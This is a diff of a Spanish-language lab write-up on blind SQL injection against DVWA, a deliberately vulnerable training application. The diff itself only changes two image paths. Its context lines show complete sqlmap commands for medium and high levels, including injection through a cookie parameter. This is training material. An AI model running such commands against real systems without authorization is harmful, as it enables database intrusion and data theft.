@@ -21,7 +21,7 @@ En este caso la inyección se realiza a través del formulario por POST. Se obti
 sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/#" --cookie "PHPSESSID=s0i2frqjujok0qsdibcem15b3s; security=medium" --data "id=1&Submit=Submit" --batch --dbs
 ```
 
-![blind_med](assets/sqli_blind_med.png)
+![blind_med](/SQLI/assets/sqli_blind_med.png)
 
 ## Alto
 
@@ -31,4 +31,4 @@ En este caso, el parámetro inyectable se encuentra en la propia cookie, por lo 
 sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli_blind/cookie-input.php" --cookie "id=15; PHPSESSID=<session>; security=high" --second-url "http://localhost/DVWA/vulnerabilities/sqli_blind" --batch
 ```
 
-![blind_hi](assets/sqli_blind_hi.png)
+![blind_hi](/SQLI/assets/sqli_blind_hi.png)
